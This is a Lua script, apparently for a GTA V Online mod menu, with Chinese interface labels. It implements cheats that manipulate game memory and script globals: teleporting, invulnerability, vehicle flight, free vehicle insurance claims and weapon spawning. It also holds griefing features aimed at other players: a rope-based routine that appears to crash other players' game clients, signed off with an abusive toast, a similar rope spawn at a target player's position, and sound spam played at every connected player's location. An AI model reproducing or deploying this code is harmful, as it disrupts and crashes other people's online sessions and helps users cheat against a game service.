    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
    util.yield(2500)
    entities.delete_by_handle(cargobob)
    entities.delete_by_handle(veh)
    PHYSICS.DELETE_CHILD_ROPE(newRope)
    menu.trigger_commands("anticrashcam off")
    util.toast("Go Fuck Your Self")
end
function get_vehicles_in_player_range(player, radius)
	local vehicles = {}
	local pos = players.get_position(player)
	for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
		local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
		if pos:distance(vehPos) <= radius then table.insert(vehicles, vehicle) end
	end
	return vehicles
end
local colour <const> = {r = 0, g = 255, b = 255, a = 255}

local function draw_marker(type, pos, scale, colour, textureDict, textureName)
	textureDict = textureDict or 0
	textureName = textureName or 0
	GRAPHICS.DRAW_MARKER(
		type,
		pos.x, pos.y, pos.z,
		0.0, 0.0, 0.0,
		0.0, 0.0, 0.0,
		scale, scale, scale,
		colour.r, colour.g, colour.b, colour.a,
		false, false, 0, true, textureDict, textureName, false
	)
end
---@param colour Colour
function rainbow_colour(colour)
	if colour.r > 0 and colour.b == 0 then
		colour.r = colour.r - 1
		colour.g = colour.g + 1
	end

	if colour.g > 0 and colour.r == 0 then
		colour.g = colour.g - 1
		colour.b = colour.b + 1
	end

	if colour.b > 0 and colour.g == 0 then
		colour.r = colour.r + 1
		colour.b = colour.b - 1
	end
end

local function rainbow_colour(colour)
	if colour.r > 0 and colour.b == 0 then
		colour.r = colour.r - 1
		colour.g = colour.g + 1
	end

	if colour.g > 0 and colour.r == 0 then
		colour.g = colour.g - 1
		colour.b = colour.b + 1
	end

	if colour.b > 0 and colour.g == 0 then
		colour.r = colour.r + 1
		colour.b = colour.b - 1
	end
end
EntityPair = {ent1 = 0, ent2 = 0}
EntityPair.__index = EntityPair

---@param ent1 Entity
---@param ent2 Entity
---@return EntityPair
function EntityPair.new(ent1, ent2)
	local instance = setmetatable({}, EntityPair)
	instance.ent1 = ent1
	instance.ent2 = ent2
	return instance
end

EntityPair.__eq = function (a, b)
	return a.ent1 == b.ent1 and a.ent2 == b.ent2
end

---@return boolean
function EntityPair:exists()
	return ENTITY.DOES_ENTITY_EXIST(self.ent1) and ENTITY.DOES_ENTITY_EXIST(self.ent2)
end

---@param ent Entity
---@param force Vector3
---@param flag? integer
local apply_force_to_ent = function (ent, force, flag)
	if ENTITY.IS_ENTITY_A_PED(ent) then
		if PED.IS_PED_A_PLAYER(ent) then return end
		PED.SET_PED_TO_RAGDOLL(ent, 1000, 1000, 0, false, false, false)
	end
	if request_control_once(ent) then
		ENTITY.APPLY_FORCE_TO_ENTITY(ent, flag or 1, force.x, force.y, force.z, 0.0, 0.0, 0.0, 0, false, false, true, false, false)
	end
end

function EntityPair:attract()
	local pos1 = ENTITY.GET_ENTITY_COORDS(self.ent1, false)
	local pos2 = ENTITY.GET_ENTITY_COORDS(self.ent2, false)
	local force = v3.new(pos2)
	force:sub(pos1)
	force:mul(0.05)
	apply_force_to_ent(self.ent1, force)
	force:mul(-1)
	apply_force_to_ent(self.ent2, force)
end
function table.find(t, value)
	for k, v in pairs(t) do
		if value == v then return k end
	end
	return nil
end
function table.insert_once(t, value)
	if not table.find(t, value) then table.insert(t, value) end
end
entityPairs = {}
shotEntities = {}
counter = 0
function ctst()
    local entity = get_entity_player_is_aiming_at(players.user())
	if entity ~= 0 and ENTITY.DOES_ENTITY_EXIST(entity) then
		draw_bounding_box(entity, true, {r = 255, g = 255, b = 255, a = 81})

		if PED.IS_PED_SHOOTING(players.user_ped()) and
		not (shotEntities[1] and shotEntities[1] == entity) then
			counter = counter + 1
			shotEntities[counter] = entity
		end

		if counter == 2 then
			local entPair = EntityPair.new(table.unpack(shotEntities))
			table.insert_once(entityPairs, entPair)
			counter = 0
			shotEntities = {}
		end
	end

	for i = #entityPairs, 1, -1 do
		local entPair = entityPairs[i]
		if entPair:exists() then entPair:attract() else table.remove(entityPairs, i) end
	end
end
function ciliqiang()
    if not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then return end
	local numVehicles = 0
	local offset = get_offset_from_cam(30.0)
	local vehicles <const> = get_vehicles_in_player_range(players.user(), 70.0)
    rainbow_colour(colour)
    draw_marker(28, offset, 0.4, colour)

	for _, vehicle in ipairs(vehicles) do
		if PED.GET_VEHICLE_PED_IS_USING(players.user_ped()) ~= vehicle and
		numVehicles < 20 and request_control_once(vehicle) then
			numVehicles = numVehicles + 1
			local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
			local vect = v3.new(offset)
			vect:sub(vehiclePos)
			if selectedOpt == 1 then
				ENTITY.SET_ENTITY_VELOCITY(vehicle, vect.x,vect.y,vect.z)

			elseif selectedOpt == 2 then
				vect:mul(0.5)
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, vect.x,vect.y,vect.z, 0.0, 0.0, 0.5, 0, false, false, true, false, false)
			end
		end
	end
end
function kxq()
    local hash <const> = util.joaat("weapon_airstrike_rocket")
	WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
	local raycastResult = get_raycast_result(1000.0)
	if raycastResult.didHit and PED.IS_PED_SHOOTING(players.user_ped()) then
		local pos = raycastResult.endCoords
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			pos.x, pos.y, pos.z + 35.0,
			pos.x, pos.y, pos.z,
			200,
			true,
			hash,
			players.user_ped(), true, false, 2500.0
		)
	end
end
---@param address integer
---@param vector v3
local function write_vector3(address, vector)
	memory.write_float(address + 0x0, vector.x)
	memory.write_float(address + 0x4, vector.y)
	memory.write_float(address + 0x8, vector.z)
end

---@param entity Entity
---@param coords v3
local function set_entity_coords(entity, coords)
	local fwEntity = entities.handle_to_pointer(entity)
	local CNavigation = memory.read_long(fwEntity + 0x30)
	if CNavigation ~= 0 then
		write_vector3(CNavigation + 0x50, coords)
		write_vector3(fwEntity + 0x90, coords)
	end
end
function csq()
    local raycastResult = get_raycast_result(1000.0)
	if  raycastResult.didHit and PED.IS_PED_SHOOTING(players.user_ped()) then
		local coords = raycastResult.endCoords
		if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
			coords.z = coords.z + 1.0
			set_entity_coords(players.user_ped(), coords)
		else
			local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
			local speed = ENTITY.GET_ENTITY_SPEED(vehicle)
			ENTITY.SET_ENTITY_COORDS(vehicle, coords.x, coords.y, coords.z, false, false, false, false)
			ENTITY.SET_ENTITY_HEADING(vehicle, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
			VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, speed + 3.0)
		end
	end
end
function qzdcolorspeed(c)
    srgb.cus = c
end
function player1(ped, loop, expSettings)
    local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)
            local spped = PLAYER.PLAYER_PED_ID()
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
            SelfPlayerPos.x = SelfPlayerPos.x + 10
            TTPos.x = TTPos.x + 10
            local carc = CreateObject(util.joaat("apa_prop_flag_china"), TTPos, ENTITY.GET_ENTITY_HEADING(spped), true)
            local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
            local pedc = CreatePed(26, util.joaat("A_C_HEN"), TTPos, 0)
            local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
            local ropec = PHYSICS.ADD_ROPE(TTPos.x, TTPos.y, TTPos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
            util.yield(3500)
            PHYSICS.DELETE_CHILD_ROPE(ropec)
            entities.delete_by_handle(pedc)
        end
function szclq(index)
    selectedOpt = index
end
function fghd()
    if TASK.GET_IS_TASK_ACTIVE(PLAYER.PLAYER_PED_ID(), 4) and PAD.IS_CONTROL_PRESSED(2, 22) and not PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        util.yield(900)
        WEAPON.REFILL_AMMO_INSTANTLY(PLAYER.PLAYER_PED_ID())
    end
end
function fkjb()
    local pos, exp_pos = v3(), v3()
    local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}
	
	for i = 1, #Audio_POS do

	AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
	pos.z = 2000.00
	
	AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
		pos.z = -2000.00
	
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
	
    for pid = 0, 31 do
        local pos =	NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pos.x, pos.y, pos.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    end

	end
end
function set_explosion_proof(entity, value)
    local pEntity = entities.handle_to_pointer(entity)
    if pEntity == 0 then return end
    local damageBits = memory.read_uint(pEntity + 0x0188)
    damageBits = value and setBit(damageBits, 11) or clearBit(damageBits, 11)
    memory.write_uint(pEntity + 0x0188, damageBits)
end
function Janos()
	local pWeapon = memory.alloc_int()
	WEAPON.GET_CURRENT_PED_WEAPON(players.user_ped(), pWeapon, 1)
	local weaponHash = memory.read_int(pWeapon)
	if WEAPON.IS_PED_ARMED(players.user_ped(), 1) or weaponHash == util.joaat("weapon_unarmed") then
		local pImpactCoords = v3.new()
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), pImpactCoords) then
			set_explosion_proof(players.user_ped(), true)
			util.yield_once()
			FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z - 1.0, 29, 5.0, false, true, 0.3, true)
		elseif not FIRE.IS_EXPLOSION_IN_SPHERE(29, pos.x, pos.y, pos.z, 2.0) then
			set_explosion_proof(players.user_ped(), false)
		end
	end
	end
    proofs = {
        bullet = {name="子弹",on=false},
        fire = {name="火烧",on=false},
        explosion = {name="爆炸",on=false},
        collision = {name="撞击",on=false},
        melee = {name="近战",on=false},
        steam = {name="蒸汽",on=false},
        drown = {name="遇水浸死",on=false},
        }
        function bitTest(addr, offset)
            return (memory.read_int(addr) & (1 << offset)) ~= 0
        end
        function autogetcar()
            local count = memory.read_int(memory.script_global(1585857))
            for i = 0, count do
                local canFix = (bitTest(memory.script_global(1585857 + 1 + (i * 142) + 103), 1) and bitTest(memory.script_global(1585857 + 1 + (i * 142) + 103), 2))
                if canFix then
                    clearBit(memory.script_global(1585857 + 1 + (i * 142) + 103), 1)
                    clearBit(memory.script_global(1585857 + 1 + (i * 142) + 103), 3)
                    clearBit(memory.script_global(1585857 + 1 + (i * 142) + 103), 16)
                    util.toast("你的载具被摧毁,为你自动索赔中...")
                end
            end
            util.yield(100)
        end
        is_vehicle_flying = false
        dont_stop = false
        no_collision = false
        speed = 6
        function do_vehicle_fly() 
            veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
            cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0);
            ENTITY.SET_ENTITY_ROTATION(veh, cam_pos.x, cam_pos.y, cam_pos.z, 1, TRUE);
            ENTITY.SET_ENTITY_COLLISION(veh, not no_collision, TRUE);
            local locspeed = speed*10
            local locspeed2 = speed
            if PAD.IS_CONTROL_PRESSED(0, 61) then 
                locspeed = locspeed*2
                locspeed2 = locspeed2*2
            end
            if PAD.IS_CONTROL_PRESSED(2, 71) then
                if dont_stop then
                    ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                else 
                    VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
                end
            end
            if PAD.IS_CONTROL_PRESSED(2, 72) then
                local lsp = speed
                if not PAD.IS_CONTROL_PRESSED(0, 61) then 
                    lsp = speed * 2
                end
                if dont_stop then
                    ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                else 
                    VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
                end
           end
            if PAD.IS_CONTROL_PRESSED(2, 63) then
                local lsp = (0 - speed)*2
                if not PAD.IS_CONTROL_PRESSED(0, 61) then 
                    lsp = 0 - speed
                end
                if dont_stop then
                    ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                else 
                    ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
                end
            end
            if PAD.IS_CONTROL_PRESSED(2, 64) then
                local lsp = speed
                if not PAD.IS_CONTROL_PRESSED(0, 61) then 
                    lsp = speed*2
                end
                if dont_stop then
                    ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                else 
                    ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                end
            end
            if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
            end
        end
        ram_direction = 0
        ram_directions = {
            [0] = "水平",
            [1] = "垂直"
        }
        vehicle_invisible = false
        vehicle = "faggio"
        vehicles = {
            [0] = "faggio",
            [1] = "adder",
            [2] = "insurgent",
            [3] = "rallytruck",
            [4] = "phantom2",
            [5] = "howard",
            [6] = "buzzard2",
            [7] = "bus"
        }
        vehicle_names = {
            [0] = "佩嘉西小绵羊摩托",
            [1] = "特卢菲灵蛇",
            [2] = "叛乱分子",
            [3] = "MTL沙丘",
            [4] = "尖锥魅影",
            [5] = "霍华德",
            [6] = "兀鹰攻击直升机",
            [7] = "巴士"
        }
        function get_model_size(hash)
            local minptr = memory.alloc(24)
            local maxptr = memory.alloc(24)
            MISC.GET_MODEL_DIMENSIONS(hash, minptr, maxptr)
            min = memory.read_vector3(minptr)
            max = memory.read_vector3(maxptr)
            local size = {}
            size['x'] = max['x'] - min['x']
            size['y'] = max['y'] - min['y']
            size['z'] = max['z'] - min['z']
            size['max'] = math.max(size['x'], size['y'], size['z'])
            memory.free(minptr)
            memory.free(maxptr)
            return size
        end
        function tesila()
            aa_threadv = util.create_thread(function()
                while true do
                    if not noaccident then
                        util.stop_thread()
                    end
                    if player_cur_car ~= 0 then
                        local c = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
                        local size = get_model_size(ENTITY.GET_ENTITY_MODEL(player_cur_car))
                        for i=1,3 do
                            if i == 1 then
                                aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, -size['x'], size['y']+0.1, size['z']/2)
                            elseif i == 2 then
                                aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, 0.0, size['y']+0.1, size['z']/2)
                            else
                                aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, size['x'], size['y']+0.1, size['z']/2)
                            end
                            if ENTITY.GET_ENTITY_SPEED(player_cur_car) > 10 then
                                log("aa thread allocation")
                                local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
                                SHAPETEST.GET_SHAPE_TEST_RESULT(
                                    SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
                                        c.x,
                                        c.y,
                                        c.z,
                                        aad.x,
                                        aad.y,
                                        aad.z,
                                        -1,
                                        player_cur_car,
                                        4
                                    ), ptr1, ptr2, ptr3, ptr4)
                                local p1 = memory.read_int(ptr1)
                                local p2 = memory.read_vector3(ptr2)
                                local p3 = memory.read_vector3(ptr3)
                                local p4 = memory.read_int(ptr4)
                                log("aa thread free mem")
                                memory.free(ptr1)
                                memory.free(ptr2)
                                memory.free(ptr3)
                                memory.free(ptr4)
                                local results = {p1, p2, p3, p4}
                                if results[1] ~= 0 then
                                    ENTITY.SET_ENTITY_VELOCITY(player_cur_car, 0.0, 0.0, 0.0)
                                    util.toast("事故即将发生，停止车辆！！")
                                end
                            end
                        end
                    end
                util.yield()
                end
            end)
        end
        local style_names = {"正常", "半冲刺", "反向", "无视红绿灯", "避开交通", "极度避开交通", "有时超车"}
local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
local weapon_stuff = {
    {"烟花", "weapon_firework"}, 
    {"原子能枪", "weapon_raypistol"},
    {"邪恶冥王", "weapon_raycarbine"},
    {"电磁步枪", "weapon_railgun"},
    {"红色激光", "vehicle_weapon_enemy_laser"},
    {"绿色激光", "vehicle_weapon_player_laser"},
    {"天煞机炮", "vehicle_weapon_player_lazer"},
    {"火箭炮", "weapon_rpg"},
    {"制导火箭发射器", "weapon_hominglauncher"},
    {"紧凑型电磁脉冲发射器", "weapon_emplauncher"},
    {"信号弹", "weapon_flaregun"},
    {"霰弹枪", "weapon_bullpupshotgun"},
    {"电击枪", "weapon_stungun"},
    {"催泪瓦斯", "weapon_smokegrenade"},
}
function shouzhiqiang()
    for id, data in pairs(weapon_stuff) do
        local name = data[1]
        local weapon_name = data[2]
        local projectile = util.joaat(weapon_name)
        while not WEAPON.HAS_WEAPON_ASSET_LOADED(projectile) do
            WEAPON.REQUEST_WEAPON_ASSET(projectile, 31, false)
            util.yield(10)
        end
        menu.toggle(finger_thing, name, {}, "", function(state)
            toggled = state
            while toggled do
                if memory.read_int(memory.script_global(4521801 + 930)) == 3 then
                    memory.write_int(memory.script_global(4521801 + 935), NETWORK.GET_NETWORK_TIME())
                    local inst = v3.new()
                    v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
                    local tmp = v3.toDir(inst)
                    v3.set(inst, v3.get(tmp))
                    v3.mul(inst, 1000)
                    v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
                    v3.add(inst, tmp)
                    local x, y, z = v3.get(inst)
                    local fingerPos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0xff9, 1.0, 0, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(fingerPos.x, fingerPos.y, fingerPos.z, x, y, z, 1, true, projectile, 0, true, false, 500.0, players.user_ped(), 0)
                end
                util.yield(100)
            end
            local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 999999, 0)
        end)
    end
end
local function Scaleform(id)
    if type(id) == "string" then
        -- this spoof script is a hacky solution to certain problems (mainly with instructional_buttons) but should work
        util.spoof_script("stats_controller",function()
            id = REQUEST_SCALEFORM_MOVIE(id)
        end)
        while not HAS_SCALEFORM_MOVIE_LOADED(id) do
            util.yield()
        end
    end
    local tbl = {id=id}
    setmetatable(tbl,metaScaleform)
    return tbl
end


b_notifications = {}
b_notifications.new = function ()
    local self = {}

    local active_notifs = {}
    self.notif_padding = 0.005
    self.notif_text_size = 0.5
    self.notif_title_size = 0.6
    self.notif_spacing = 0.015
    self.notif_width = 0.15
    self.notif_flash_duration = 1
    self.notif_anim_speed = 1
    self.notif_banner_colour = {r = 1, g = 0, b = 1, a = 1}
    self.notif_flash_colour = {r = 0.5, g = 0.0, b = 0.5, a = 1}
    self.max_notifs = 10
    self.notif_banner_height = 0.002
    self.use_toast = false
    local split = function (input, sep)
        local t={}
        for str in string.gmatch(input, "([^"..sep.."]+)") do
                table.insert(t, str)
        end
        return t
    end
    
    local function lerp(a, b, t)
        return a + (b - a) * t
    end
    local cut_string_to_length = function(input, length, fontSize)
        input = split(input, " ")
        local output = {}
        local line = ""
        for i, word in ipairs(input) do
            if directx.get_text_size(line..word, fontSize) >= length then
                if directx.get_text_size(word, fontSize) > length then
                    while directx.get_text_size(word , fontSize) > length do
                        local word_lenght = string.len(word)
                        for x = 1, word_lenght, 1 do
                            if directx.get_text_size(line..string.sub(word ,1, x), fontSize) > length then
                                output[#output+1] = line..string.sub(word, 1, x - 1)
                                line = ""
                                word = string.sub(word, x, word_lenght)
                                break
                            end
                        end
                    end
                else
                    output[#output+1] =  line
                    line = ""
                end
            end
            if i == #input then
                output[#output+1] = line..word
            end
            line = line..word.." "
        end
        return table.concat(output, "\n")
    end

    local draw_notifs = function ()
        local aspect_16_9 = 1.777777777777778
        util.create_tick_handler(function ()
            local total_height = 0
            local delta_time = MISC.GET_FRAME_TIME()
            for i = #active_notifs, 1, -1 do
                local notif = active_notifs[i]
                local notif_body_colour = notif.colour
                if notif.flashtimer > 0 then
                    notif_body_colour = self.notif_flash_colour
                    notif.flashtimer = notif.flashtimer - delta_time
                end
                if notif.current_y_pos == -10 then
                    notif.current_y_pos = total_height
                end
                notif.current_y_pos = lerp(notif.current_y_pos, total_height, 5 * delta_time * self.notif_anim_speed)
                if not notif.marked_for_deletetion then
                    notif.animation_state = lerp(notif.animation_state, 1, 10 * delta_time * self.notif_anim_speed)
                end
                --#region
                    directx.draw_rect(
                        1 - self.notif_width - self.notif_padding * 2,
                        0.1 - self.notif_padding * 2 * aspect_16_9 + notif.current_y_pos,
                        self.notif_width + (self.notif_padding * 2),
                        (notif.text_height + notif.title_height + self.notif_padding * 2 * aspect_16_9) * notif.animation_state,
                        notif_body_colour
                    )
                    directx.draw_rect(
                        1 - self.notif_width - self.notif_padding * 2,
                        0.1 - self.notif_padding * 2 * aspect_16_9 + notif.current_y_pos,
                        self.notif_width + (self.notif_padding * 2),
                        self.notif_banner_height * aspect_16_9 * notif.animation_state,
                        self.notif_banner_colour
                    )
                    directx.draw_text(
                        1 - self.notif_padding - self.notif_width,
                        0.1 - self.notif_padding * aspect_16_9 + notif.current_y_pos,
                        notif.title,
                        ALIGN_TOP_LEFT,
                        self.notif_title_size,
                        {r = 1 * notif.animation_state, g = 1 * notif.animation_state, b = 1 * notif.animation_state, a = 1 * notif.animation_state}
                    )
                    directx.draw_text(
                        1 - self.notif_padding - self.notif_width,
                        0.1 - self.notif_padding * aspect_16_9 + notif.current_y_pos + notif.title_height,
                        notif.text,
                        ALIGN_TOP_LEFT,
                        self.notif_text_size,
                        {r = 1 * notif.animation_state, g = 1 * notif.animation_state, b = 1 * notif.animation_state, a = 1 * notif.animation_state}
                    )
    --#endregion
                total_height = total_height + ((notif.total_height + self.notif_padding * 2 + self.notif_spacing) * notif.animation_state)
                if notif.marked_for_deletetion then
                    notif.animation_state = lerp(notif.animation_state, 0, 10 * delta_time)
                    if notif.animation_state < 0.05 then
                        table.remove(active_notifs, i)
                    end
                elseif notif.duration < 0 then
                    notif.marked_for_deletetion = true
                end
                notif.duration = notif.duration - delta_time
            end
            return #active_notifs > 0
        end)
    end

    self.notify = function (title,text, duration, colour)
        if self.use_toast then
            util.toast(title.."\n"..text)
            return
        end
        title = cut_string_to_length(title, self.notif_width, self.notif_title_size)
        text = cut_string_to_length(text, self.notif_width, self.notif_text_size)
        local x, text_heigth = directx.get_text_size(text, self.notif_text_size)
        local xx, title_height = directx.get_text_size(title, self.notif_title_size)
        local hash = util.joaat(title..text)
        local new_notification = {
            title = title,
            flashtimer = self.notif_flash_duration,
            colour = colour or {r = 0.2, g = 0.1, b = 0.3, a = 1},
            duration = duration or 3,
            current_y_pos = -10,
            marked_for_deletetion = false,
            animation_state = 0,
            text = text,
            hash = hash,
            text_height = text_heigth,
            title_height = title_height,
            total_height = title_height + text_heigth
        }
        for i, notif in ipairs(active_notifs) do
            if notif.hash == hash then
                notif.flashtimer = self.notif_flash_duration * 0.5
                notif.marked_for_deletetion = false
                notif.duration = duration or 3
                return
            end
        end
        active_notifs[#active_notifs+1] = new_notification
        if #active_notifs > self.max_notifs then
            table.remove(active_notifs, 1)
        end
        if #active_notifs == 1 then draw_notifs() end
    end

    return self
end

return Scaleform
